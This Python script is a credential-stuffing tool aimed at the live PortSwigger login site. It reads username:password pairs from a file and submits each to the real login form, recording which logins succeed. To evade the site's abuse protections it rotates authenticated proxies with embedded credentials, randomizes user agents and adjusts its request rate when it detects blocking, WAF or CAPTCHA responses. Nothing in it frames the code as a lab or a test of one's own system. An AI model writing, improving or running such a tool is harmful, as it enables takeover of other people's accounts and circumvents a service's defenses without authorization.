#!/usr/bin/env python3
"""
PortSwigger Login Checker - Improved Version
Fixes HTTP 400 blocking issue with adaptive proxy rotation and rate limiting
"""

import requests
import time
import json
import re
import random
from typing import Dict, Optional, Tuple
from datetime import datetime

class PortSwiggerImprovedChecker:
    """Login checker with improved proxy rotation and rate limiting."""

    PROXIES = [
        "http://myagentyltd:Kb5xW8vW2B@66.248.146.48:50100",
        "http://myagentyltd:Kb5xW8vW2B@208.53.9.5:50100",
    ]

    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    ]

    def __init__(self, base_rate_limit: float = 3.0, debug: bool = True):
        """
        Initialize with adaptive rate limiting.

        Args:
            base_rate_limit: Base seconds between requests (will increase on blocks)
            debug: Enable verbose debugging
        """
        self.base_url = "https://login.portswigger.net"
        self.base_rate_limit = base_rate_limit
        self.current_rate_limit = base_rate_limit
        self.last_request_time = 0
        self.debug = debug
        self.test_results = []
        self.proxy_index = 0
        self.proxy_request_count = 0
        self.proxy_rotation_interval = 50  # Rotate proxy every 50 requests
        self.current_proxy = None
        self.block_detected_count = 0
        self.request_count = 0

        if self.debug:
            print(f"[+] Initialized with {len(self.PROXIES)} proxies")
            print(f"[+] Base rate limit: {base_rate_limit}s per request")
            print(f"[+] Proxy rotation interval: {self.proxy_rotation_interval} requests")

    def _get_next_proxy(self) -> str:
        """Get next proxy and rotate if needed."""
        self.proxy_request_count += 1

        # Force proxy rotation at interval
        if self.proxy_request_count >= self.proxy_rotation_interval:
            self.proxy_index = (self.proxy_index + 1) % len(self.PROXIES)
            self.proxy_request_count = 0
            if self.debug:
                print(f"[+] Proxy rotated (interval). Now on proxy {self.proxy_index + 1}")

        self.current_proxy = self.PROXIES[self.proxy_index]
        return self.current_proxy

    def _get_random_user_agent(self) -> str:
        """Get random user agent."""
        return random.choice(self.USER_AGENTS)

    def _get_headers(self) -> Dict:
        """Get request headers with randomization."""
        return {
            "User-Agent": self._get_random_user_agent(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Cache-Control": "max-age=0",
            "Pragma": "no-cache",
        }

    def _enforce_rate_limit(self) -> None:
        """Enforce adaptive rate limiting."""
        elapsed = time.time() - self.last_request_time

        if elapsed < self.current_rate_limit:
            sleep_time = self.current_rate_limit - elapsed
            if self.debug and self.request_count % 10 == 0:
                print(f"[DEBUG] Rate limit: sleeping {sleep_time:.1f}s")
            time.sleep(sleep_time)

        self.last_request_time = time.time()

    def _extract_form_fields(self, html_content: str) -> Dict[str, str]:
        """Extract all form fields from HTML."""
        fields = {}

        for match in re.finditer(r'<input[^>]*>', html_content):
            input_tag = match.group(0)
            name_match = re.search(r'name\s*=\s*["\']?([^"\'\s>]+)', input_tag, re.IGNORECASE)
            value_match = re.search(r'value\s*=\s*["\']([^"\']*)["\']', input_tag)

            if not value_match:
                value_match = re.search(r'value\s*=\s*([^"\'\s>]+)', input_tag)

            if name_match:
                field_name = name_match.group(1)
                field_value = value_match.group(1) if value_match else ""
                fields[field_name] = field_value

        return fields

    def _detect_block(self, status_code: int, html: str) -> Tuple[bool, str]:
        """Detect various forms of blocking/rate limiting."""
        if status_code == 429:
            return True, "HTTP 429 - Rate limited"
        if status_code == 403:
            return True, "HTTP 403 - Forbidden/WAF"
        if status_code == 400:
            # 400 after initial successes indicates IP blocking
            if self.block_detected_count > 0:
                return True, "HTTP 400 - Pattern detected (likely IP block)"
        if "cloudflare" in html.lower():
            return True, "Cloudflare WAF detected"
        if "captcha" in html.lower() or "hcaptcha" in html.lower():
            return True, "CAPTCHA detected"
        return False, ""

    def check_login(self, username: str, password: str) -> Dict:
        """Test login with proxy rotation and adaptive rate limiting."""

        result = {
            "timestamp": datetime.now().isoformat(),
            "username": username,
            "status": "UNKNOWN",
            "status_code": None,
            "proxy": None,
            "rate_limit": self.current_rate_limit,
        }

        self.request_count += 1

        # Get rotating proxy
        proxy_url = self._get_next_proxy()
        result["proxy"] = proxy_url.split("@")[1] if "@" in proxy_url else proxy_url

        try:
            # Create FRESH session for each request (no cookie reuse)
            session = requests.Session()
            proxies = {
                "http": proxy_url,
                "https": proxy_url,
            }
            session.proxies.update(proxies)

            headers = self._get_headers()
            self._enforce_rate_limit()

            # Step 1: GET /u/login
            try:
                init_response = session.get(
                    f"{self.base_url}/u/login",
                    headers=headers,
                    timeout=30,
                    allow_redirects=True,
                    verify=True
                )
            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
                result["status"] = "NETWORK_ERROR"
                result["error"] = str(type(e).__name__)
                self.test_results.append(result)
                return result

            result["status_code"] = init_response.status_code

            # Check for blocking on GET
            is_blocked, block_msg = self._detect_block(init_response.status_code, init_response.text)
            if is_blocked:
                result["status"] = "BLOCKED_GET"
                result["error"] = block_msg
                self.block_detected_count += 1
                # Increase rate limit on detection
                if self.block_detected_count % 5 == 0:
                    self.current_rate_limit = min(self.current_rate_limit * 1.5, 30.0)
                    if self.debug:
                        print(f"[!] Block pattern detected. Increasing rate limit to {self.current_rate_limit:.1f}s")
                self.test_results.append(result)
                return result

            # Extract form fields
            form_fields = self._extract_form_fields(init_response.text)
            if not form_fields:
                form_fields = {}

            # Step 2: POST credentials
            self._enforce_rate_limit()

            payload = form_fields.copy()
            payload["username"] = username
            payload["password"] = password

            if "action" not in payload:
                payload["action"] = "default"

            headers["Referer"] = f"{self.base_url}/u/login"
            headers["Content-Type"] = "application/x-www-form-urlencoded"

            try:
                response = session.post(
                    f"{self.base_url}/u/login",
                    data=payload,
                    headers=headers,
                    timeout=30,
                    allow_redirects=False,
                    verify=True
                )
            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
                result["status"] = "NETWORK_ERROR"
                result["error"] = str(type(e).__name__)
                self.test_results.append(result)
                return result

            result["status_code"] = response.status_code

            # Check for blocking on POST
            is_blocked, block_msg = self._detect_block(response.status_code, response.text)
            if is_blocked:
                result["status"] = "BLOCKED_POST"
                result["error"] = block_msg
                self.block_detected_count += 1
                # Increase rate limit on detection
                if self.block_detected_count % 5 == 0:
                    self.current_rate_limit = min(self.current_rate_limit * 1.5, 30.0)
                    if self.debug:
                        print(f"[!] Block pattern detected. Increasing rate limit to {self.current_rate_limit:.1f}s")
                self.test_results.append(result)
                return result

            # Analyze login response
            if response.status_code == 302 or response.status_code == 303:
                redirect = response.headers.get("Location", "")

                if "error" in redirect.lower():
                    result["status"] = "FAILED_LOGIN"
                    result["error"] = "Login error in redirect"
                else:
                    result["status"] = "SUCCESS"
                    result["redirect"] = redirect[:100]
                    self.block_detected_count = 0  # Reset block counter on success

            elif response.status_code == 200:
                if "error" in response.text.lower() or "invalid" in response.text.lower():
                    result["status"] = "FAILED_LOGIN"
                    result["error"] = "Invalid credentials"
                else:
                    result["status"] = "LOGIN_PAGE"

            else:
                result["status"] = f"HTTP_{response.status_code}"
                result["error"] = "Unexpected response"

        except Exception as e:
            result["status"] = "ERROR"
            result["error"] = str(e)

        self.test_results.append(result)
        return result

    def check_multiple_accounts(self, credentials_list: list) -> list:
        """Test multiple accounts with adaptive rate limiting."""
        print(f"\n[*] PortSwigger Login Checker - Improved")
        print(f"[*] Total accounts: {len(credentials_list)}")
        print(f"[*] Proxies: {len(self.PROXIES)}")
        print(f"[*] Base rate limit: {self.base_rate_limit}s per request")
        print(f"[*] Proxy rotation: every {self.proxy_rotation_interval} requests")
        print("-" * 70)

        for idx, creds in enumerate(credentials_list, 1):
            username = creds.get("username", "")
            password = creds.get("password", "")

            if idx % 50 == 0:
                print(f"\n[*] Progress: {idx}/{len(credentials_list)} | Current rate limit: {self.current_rate_limit:.1f}s | Blocks detected: {self.block_detected_count}")

            result = self.check_login(username, password)

            # Show errors
            if result["status"] not in ["SUCCESS", "FAILED_LOGIN"]:
                status_symbol = "⚠"
                print(f"[{idx}/{len(credentials_list)}] {status_symbol} {username[:40]:40} | {result['status']}")
                if result.get('error'):
                    print(f"    └─ {result['error']}")

        print("\n" + "=" * 70)
        return self.test_results

    def get_summary(self) -> Dict:
        """Get summary statistics."""
        if not self.test_results:
            return {"total": 0}

        return {
            "total": len(self.test_results),
            "successful": sum(1 for r in self.test_results if r["status"] == "SUCCESS"),
            "failed": sum(1 for r in self.test_results if r["status"] == "FAILED_LOGIN"),
            "blocked": sum(1 for r in self.test_results if "BLOCKED" in r["status"]),
            "network_errors": sum(1 for r in self.test_results if r["status"] == "NETWORK_ERROR"),
            "errors": sum(1 for r in self.test_results if r["status"] == "ERROR"),
        }

    def export_results(self, filename: str = "portswigger_results.json") -> None:
        """Export results to JSON."""
        with open(filename, 'w') as f:
            json.dump({
                "results": self.test_results,
                "summary": self.get_summary(),
                "timestamp": datetime.now().isoformat()
            }, f, indent=2)
        print(f"[+] Results exported to: {filename}")


def main():
    """Main entry point."""
    checker = PortSwiggerImprovedChecker(
        base_rate_limit=3.0,  # Start with 3 seconds, will increase if blocked
        debug=True
    )

    log_file = "log.txt"
    test_credentials = []

    try:
        with open(log_file, 'r') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if ":" in line:
                    parts = line.split(":", 1)
                    test_credentials.append({
                        "username": parts[0].strip(),
                        "password": parts[1].strip()
                    })

        if not test_credentials:
            print(f"[ERROR] No credentials in {log_file}")
            return

        print(f"[+] Loaded {len(test_credentials)} credentials\n")

    except FileNotFoundError:
        print(f"[ERROR] {log_file} not found")
        return

    # Run tests
    results = checker.check_multiple_accounts(test_credentials)

    # Print summary
    summary = checker.get_summary()
    print(f"\n[SUMMARY]")
    print(f"Total: {summary['total']}")
    print(f"Successful: {summary['successful']}")
    print(f"Failed: {summary['failed']}")
    print(f"Blocked: {summary['blocked']}")
    print(f"Network errors: {summary['network_errors']}")
    print(f"Errors: {summary['errors']}")

    # Export
    checker.export_results()


if __name__ == "__main__":
    main()
